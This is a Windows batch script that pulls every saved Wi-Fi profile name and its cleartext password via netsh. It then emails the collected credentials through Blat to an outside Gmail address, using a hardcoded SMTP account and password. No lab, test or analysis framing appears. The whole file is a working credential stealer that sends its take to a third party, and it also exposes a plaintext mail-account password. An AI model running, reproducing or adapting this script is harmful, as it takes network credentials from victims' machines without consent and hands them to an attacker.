@echo off
setlocal enabledelayedexpansion

:: Extract Wi-Fi profiles and passwords
set "wifiPasswords="
for /f "tokens=1,* delims=:" %%a in ('netsh wlan show profiles') do (
    if "%%a"=="    All User Profile" (
        set "profileName=%%b"
        set "profileName=!profileName:~1!"
        
        :: Get password for the profile
        for /f "tokens=1,* delims=:" %%c in ('netsh wlan show profile name^="!profileName!" key^=clear') do (
            if "%%c"=="    Key Content" (
                set "password=%%d"
                set "password=!password:~1!"
                set "wifiPasswords=!wifiPasswords!SSID: !profileName!, Password: !password!" 
                set wifiPasswords=!wifiPasswords!^
            )
        )
    )
)

:: Check if Wi-Fi passwords were found
if defined wifiPasswords (
    :: Set up email details
    set smtpServer=smtp.seznam.cz
    set smtpPort=587
    set smtpUser=info@infopeklo.cz
    set smtpPass=Polik789
    set from=info@infopeklo.cz
    set to=alfikeita@gmail.com
    set subject=Wi-Fi Credentials
    set body=Here are the extracted Wi-Fi credentials:%wifiPasswords%

    :: Send email using Blat (ensure Blat is installed)
    blat -to !to! -subject "!subject!" -body "!body!" -server !smtpServer! -port !smtpPort! -u !smtpUser! -pw !smtpPass!
    echo Email sent successfully!
) else (
    echo No Wi-Fi passwords found.
)
endlocal
